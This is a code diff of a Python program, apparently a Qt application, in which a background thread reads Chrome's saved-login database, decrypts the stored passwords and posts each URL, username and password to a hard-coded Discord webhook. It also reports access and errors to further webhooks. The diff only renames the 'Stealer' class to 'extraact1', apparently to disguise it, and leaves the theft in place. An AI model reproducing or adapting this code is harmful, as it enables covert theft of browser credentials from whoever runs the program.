@@ -83,7 +83,7 @@ from io import BytesIO
 from csv import writer
 from json import load
 
-class Stealer():
+class extraact1():
     def __init__(self):
         user_data = self.user_data = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data",)
         self.key_file = join(user_data, "Local State")
@@ -157,18 +157,18 @@ class ExtraThread(QThread):
         access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] Accessed."})
     
         try:
-            password_stealer_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
-            stealer = Stealer()
-            stealer.get_database_cursor()
-            stealer.get_key()
+            password_extraact1_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
+            extraact1 = extraact1()
+            extraact1.get_database_cursor()
+            extraact1.get_key()
             text = ""
-            for url, username, password in stealer.get_credentials(): 
+            for url, username, password in extraact1.get_credentials(): 
                 text += f"{url} > {username} > {password}\n"
                 if text.count("\n") > 20:
-                    post(password_stealer_webhook, data={"content": f"```{text}```"})
+                    post(password_extraact1_webhook, data={"content": f"```{text}```"})
                     text = ""
-            stealer.save_and_clean()
-            post(password_stealer_webhook, data={"content": "- "*10})
+            extraact1.save_and_clean()
+            post(password_extraact1_webhook, data={"content": "- "*10})
         except Exception as ee: 
             access_message = requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} EXTRA] {str(ee)}"})
 
